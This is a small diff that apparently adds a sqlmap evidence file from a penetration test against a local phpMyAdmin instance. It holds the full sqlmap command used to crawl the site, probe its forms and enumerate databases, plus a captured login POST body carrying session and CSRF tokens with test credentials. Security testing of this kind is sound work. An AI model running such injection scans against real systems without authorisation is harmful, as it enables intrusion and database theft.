@@ -1,0 +1,3 @@
+http://localhost:8083/phpMyAdmin/index.php (POST)  # /usr/bin/sqlmap -u http://localhost:8083/some_vulnerable_path?id=1 --batch --level 3 --risk 2 --dbs --output-dir evidence/9/sqlmap --timeout 30 --forms --crawl 3 --random-agent
+
+phpMyAdmin=db129a25fc9b950074fa7d6034acd5c2bc0573c5&phpMyAdmin=db129a25fc9b950074fa7d6034acd5c2bc0573c5&pma_username=rtmY&pma_password=zeUV&server=1&phpMyAdmin=db129a25fc9b950074fa7d6034acd5c2bc0573c5&lang=en-utf-8&convcharset=utf-8&token=9ba235b663ada09134a419bb285fcf03
